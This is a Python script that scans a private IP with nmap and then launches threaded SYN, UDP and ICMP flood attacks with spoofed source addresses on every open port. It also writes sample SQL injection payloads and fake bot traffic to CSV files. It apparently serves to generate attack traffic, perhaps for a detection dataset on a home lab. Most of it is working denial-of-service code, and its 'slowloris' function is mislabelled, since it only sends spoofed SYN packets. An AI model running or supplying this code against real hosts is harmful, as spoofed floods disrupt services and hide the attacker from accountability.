import threading
import time
import pandas as pd
import os
import subprocess
from scapy.all import IP, TCP, UDP, ICMP, send, sendp, RandIP
from faker import Faker
from concurrent.futures import ThreadPoolExecutor

NMAP_PATH = r"C:\Program Files (x86)\Nmap\nmap.exe" 

target_ip = "192.168.0.116"
faker = Faker()

def check_nmap():
    try:
        result = subprocess.run([NMAP_PATH, "--version"], capture_output=True, text=True, check=True)
        print(result.stdout)
        return True
    except FileNotFoundError:
        print(f"[ERROR] Nmap not found at {NMAP_PATH}. Please install it.")
        return False

def get_open_ports(target):
    print(f"Scanning open ports on {target}...")
    ports = []
    try:
        result = subprocess.run([NMAP_PATH, "-p", "1-65535", target], capture_output=True, text=True, check=True)
        lines = result.stdout.split("\n")
        for line in lines:
            if "/tcp" in line and "open" in line:
                port = int(line.split("/")[0])
                ports.append(port)
        print(f"Found open ports: {ports}")
        return ports
    except Exception as e:
        print(f"[ERROR] Nmap scanning failed: {e}")
        return []

if not check_nmap():
    exit()

open_ports = get_open_ports(target_ip)
if not open_ports:
    print("[INFO] No open ports found. Please check your target IP manually.")
    exit()

def syn_flood(port):
    print(f"Starting SYN Flood Attack on port {port}...")
    try:
        for _ in range(10000):  
            packet = IP(dst=target_ip, src=RandIP()) / TCP(dport=port, flags="S")
            send(packet, verbose=False)
        print(f"[SUCCESS] SYN Flood Attack on port {port} completed!")
    except Exception as e:
        print(f"[ERROR] SYN Flood Attack failed: {e}")

def udp_flood(port):
    print(f"Starting UDP Flood Attack on port {port}...")
    try:
        for _ in range(10000):  
            packet = IP(dst=target_ip, src=RandIP()) / UDP(dport=port) / (b"\x00" * 512)  # Large packet
            send(packet, verbose=False)
        print(f"[SUCCESS] UDP Flood Attack on port {port} completed!")
    except Exception as e:
        print(f"[ERROR] UDP Flood Attack failed: {e}")

def slowloris(port):
    print(f"Starting Slowloris Attack on port {port}...")
    try:
        for _ in range(5000):  
            send(IP(dst=target_ip, src=RandIP()) / TCP(dport=port, flags="S"), verbose=False)
            time.sleep(0.1)  
        print(f"[SUCCESS] Slowloris Attack on port {port} completed!")
    except Exception as e:
        print(f"[ERROR] Slowloris Attack failed: {e}")

def icmp_flood():
    print("Starting ICMP (Ping) Flood Attack...")
    try:
        for _ in range(5000):  
            packet = IP(dst=target_ip, src=RandIP()) / ICMP()
            send(packet, verbose=False)
        print("[SUCCESS] ICMP Flood Attack completed!")
    except Exception as e:
        print(f"[ERROR] ICMP Flood Attack failed: {e}")

def sql_injection():
    print("Generating SQL Injection Logs...")
    try:
        sql_samples = ["' OR '1'='1' --", "' UNION SELECT username, password FROM users --"]
        df = pd.DataFrame({"Attack Type": ["SQL Injection"] * len(sql_samples), "Payload": sql_samples})
        df.to_csv("sql_injection_logs.csv", index=False)
        print("[SUCCESS] SQL Injection Logs generated!")
    except Exception as e:
        print(f"[ERROR] SQL Injection log generation failed: {e}")

def fake_bot_traffic():
    print("Generating Fake Bot Traffic...")
    try:
        data = [{"IP": faker.ipv4(), "Attack_Type": "Bot Traffic", "Payload": faker.sentence()} for _ in range(500)]
        df = pd.DataFrame(data)
        df.to_csv("fake_bot_traffic.csv", index=False)
        print("[SUCCESS] Fake Bot Traffic generated!")
    except Exception as e:
        print(f"[ERROR] Fake Bot Traffic generation failed: {e}")

with ThreadPoolExecutor(max_workers=10) as executor:
    for port in open_ports:
        executor.submit(syn_flood, port)
        executor.submit(udp_flood, port)  
        executor.submit(slowloris, port)

    executor.submit(icmp_flood)  
    executor.submit(sql_injection)
    executor.submit(fake_bot_traffic)

print("[INFO] All attacks completed!")
